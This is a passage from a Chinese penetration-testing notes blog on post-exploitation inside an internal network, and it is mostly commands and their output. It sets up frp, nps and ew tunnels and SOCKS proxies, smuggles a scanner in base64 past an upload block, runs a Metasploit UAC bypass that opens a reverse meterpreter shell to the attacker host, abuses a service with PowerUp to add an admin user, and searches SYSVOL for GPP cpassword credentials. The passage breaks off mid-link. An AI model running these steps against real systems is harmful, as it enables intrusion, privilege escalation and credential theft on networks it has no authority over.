class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p><p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p><h1 id="0x11-frp-的使用"><a href="#0x11-frp-的使用" class="headerlink" title="0x11 frp 的使用"></a>0x11 frp 的使用</h1><h2 id="1、介绍-4"><a href="#1、介绍-4" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p><p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p><h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p><blockquote><p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p></blockquote><h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p><p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置客户端配置文件</p><pre class="line-numbers language-none"><code class="language-none">[common]# 服务端 IPserver_addr &#x3D; vps_ip# 服务端端口server_port &#x3D; 4444[rdp]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 3389# 连接 vps 的端口remote_port &#x3D; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021&#x2F;06&#x2F;09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021&#x2F;06&#x2F;09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png"></p><h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p><p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p><p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p><p>在 VPS 上开启服务端，服务端配置文件如下：</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444# 客户端认证 tokentoken &#x3D; 123456# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码dashboard_port &#x3D; 8000dashboard_user &#x3D; admindashboard_pwd &#x3D; password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p></blockquote><p>配置好文件后，启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:80002021&#x2F;06&#x2F;09 04:06:35 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置客户端文件</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; vps_ipserver_port &#x3D; 4444# 客户端认证 token，需要和服务端 token 保持一致token &#x3D; 123456# 启用加密，防止流量被拦截use_encryption &#x3D; true# 启用压缩，提升流量转发速度use_compression &#x3D; true[socks5]type &#x3D; tcp# 连接 vps 的端口remote_port &#x3D; 1080plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启客户端</p><pre class="line-numbers language-none"><code class="language-none">frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]2021&#x2F;06&#x2F;09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]2021&#x2F;06&#x2F;09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161458.png"></p><p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161859.png"></p><p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p><h1 id="0x12-nps-的使用"><a href="#0x12-nps-的使用" class="headerlink" title="0x12 nps 的使用"></a>0x12 nps 的使用</h1><h2 id="1、介绍-5"><a href="#1、介绍-5" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>nps 项目地址：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>也是一款还在更新的内网穿透工具，相较于 frp，nps 的 web 管理就要强大很多了。</p><p>nps 和 frp 一样功能都很多，这里就主要记录下平时经常用到的 SOCKS5 代理模式。</p><h2 id="2、安装-2"><a href="#2、安装-2" class="headerlink" title="2、安装"></a>2、安装</h2><p>nps 不同于 frp 的开箱即用，nps 的服务端需要安装才能使用，这里以 kali 下的安装为例。</p><p>在 nps 项目的 releases 中下载好自己对应系统的版本后，解压安装</p><pre class="line-numbers language-none"><code class="language-none">tar -zxvf linux_amd64_server.tar.gz.&#x2F;nps install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、使用-2"><a href="#3、使用-2" class="headerlink" title="3、使用"></a>3、使用</h2><p>官方使用文档：<a href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p><p>启动服务端，默认 Web 管理界面端口 8080 </p><pre class="line-numbers language-none"><code class="language-none">nps start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动 nps 后，直接访问服务端的 8080 端口，输入默认密码 admin/123 进行登录，不难看出，这 web 界面确实比 frp 的丰富很多。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609170306.png"></p><p>nps 的使用也很简单，界面语言也可选择中文。</p><p>首先新增一个客户端，点击 “客户端” –》“新增”，打开新增客户端页面，填写相关信息后，点击新增即可</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609171610.png"></p><p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172254.png"></p><p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172144.png"></p><p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172512.png"></p><p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609173211.png"></p><p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p><h1 id="0x13-内网中绕过无法上传文件限制"><a href="#0x13-内网中绕过无法上传文件限制" class="headerlink" title="0x13 内网中绕过无法上传文件限制"></a>0x13 内网中绕过无法上传文件限制</h1><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>有次发现这样的一个情况，目标云桌面不出网且不允许上传文件但是可以复制文本，于是便想着通过 PowerShell 将 exe 程序编码成 base64 文本，将编码后的内容复制到目标主机后，再进行解码，这里记录下方法。</p><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><p>使用 PowerShell 进行 base64 编码</p><pre class="line-numbers language-none"><code class="language-none">$PEBytes &#x3D; [System.IO.File]::ReadAllBytes(&quot;fscan.exe&quot;)$Base64Payload &#x3D; [System.Convert]::ToBase64String($PEBytes)Set-Content fscan_base64.txt -Value $Base64Payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 PowerShell 进行 base64 解码</p><pre class="line-numbers language-none"><code class="language-none">$Base64Bytes &#x3D; Get-Content (&quot;fscan_base64.txt&quot;)$PEBytes&#x3D; [System.Convert]::FromBase64String($Base64Bytes)[System.IO.File]::WriteAllBytes(&quot;fscan_base64.exe&quot;,$PEBytes)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png"></p><h2 id="3、CertUtil"><a href="#3、CertUtil" class="headerlink" title="3、CertUtil"></a>3、CertUtil</h2><p>自 Windows 7 开始，Windows 自带了 CertUtil 命令，可以使用 CertUtil 进行 MD5、SHA1 等算法的计算，也可以使用 CertUtil 进行 base64 的编码，使用起来要比 PowerShell 方便不少。</p><p>使用 CertUtil 进行编码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -encode fscan.exe fscan_base64.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 CertUtil 进行解码</p><pre class="line-numbers language-none"><code class="language-none">CertUtil -decode fscan_base64.txt fscan_base64.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630173155.png"> </p><h1 id="0x14-发现主机缺失补丁"><a href="#0x14-发现主机缺失补丁" class="headerlink" title="0x14 发现主机缺失补丁"></a>0x14 发现主机缺失补丁</h1><h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p><h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2999226  Update       KB2999226  11&#x2F;26&#x2F;2020http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;976902   Update       KB976902   11&#x2F;21&#x2F;2010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p><h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p><p>Sherlock 项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><p>导入脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Sherlock 命令</p><pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns搜索所有未安装的补丁Find-MS16032搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patchesmsf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1session &#x3D;&gt; 1msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run[+] KB2999226 installed on 11&#x2F;26&#x2F;2020[+] KB976902 installed on 11&#x2F;21&#x2F;2010[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p><p>首先查看下当前会话权限</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p><p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1session &#x3D;&gt; 1msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1session &#x3D;&gt; 1msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run[*] Started reverse TCP handler on 10.101.22.38:4444[*] UAC is Enabled, checking level...[+] Part of Administrators group! Continuing...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[*] Configuring payload and stager registry keys ...[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.[*] Sending stage (175174 bytes) to 172.16.214.4[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800[*] Cleaning up registry keys ...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 1 created.组信息-----------------组名                                 类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\High Mandatory Level 标签   S-1-16-12288 必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，使用 exploit/windows/local/bypassuac_eventvwr 模块直接将目标权限提升到了 High Mandatory Level，即管理员权限，这里可以说 MSF 很方便了。</p><h3 id="wesng"><a href="#wesng" class="headerlink" title="wesng"></a>wesng</h3><p>wesng 被称为 Windows Exploit Suggester 的下一代，wesng 和 Windows Exploit Suggester 的使用方法基本一致，但 wesng 所支持的操作系统更丰富，不过实测 wesng 还未支持 Windows 11 『手动狗头』</p><p>wesng 的安装方法也很简单</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bitsadmin&#x2F;wesng.gitcd wesngpython wes.py --update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用起来也很简单，直接在目标主机上运行以下命令，将 systeminfo 的信息保存到 txt 中。</p><pre class="line-numbers language-none"><code class="language-none">systeminfo &gt; info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接使用 wesng 即可</p><pre class="line-numbers language-none"><code class="language-none">python wes.py info.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png"></p><p>使用 wesng 可以直接看到目标主机可能存在的 CVE 漏洞，从而便于我们有针对性的利用这些漏洞。</p><h1 id="0x15-系统服务权限配置不当利用"><a href="#0x15-系统服务权限配置不当利用" class="headerlink" title="0x15 系统服务权限配置不当利用"></a>0x15 系统服务权限配置不当利用</h1><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p><p>在 PowerShell 中导入并执行脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;[*] Running Invoke-AllChecks[*] Checking if user is in a local group with administrative privileges...[+] User is in a local group that grants administrative privileges![+] Run a BypassUAC attack to elevate privileges to admin.[*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...ServiceName    : MongoDBPath           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s                 erviceModifiableFile : C:\Web\mongodb\mongod.confStartName      : LocalSystemAbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;ServiceName                   ServicePath                   Command                       BackupPath-----------                   -----------                   -------                       ----------MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd &#x2F;ad... C:\Web\mongodb\bin\mongod...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; net user test用户名                 test全名……本地组成员             *Administrators       *Users全局组成员             *None命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getuidServer username: TEAMSSIX\dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p><p>利用步骤如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissionsset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.7.1set lport 4444set session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png"></p><p>可以看到会话直接被提升到了 SYSTEM 权限。</p><h1 id="0x16-组策略凭据获取"><a href="#0x16-组策略凭据获取" class="headerlink" title="0x16 组策略凭据获取"></a>0x16 组策略凭据获取</h1><h2 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p><p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p><p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p><h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728141704.png"></p><p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p><pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728142511.png"></p><h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a 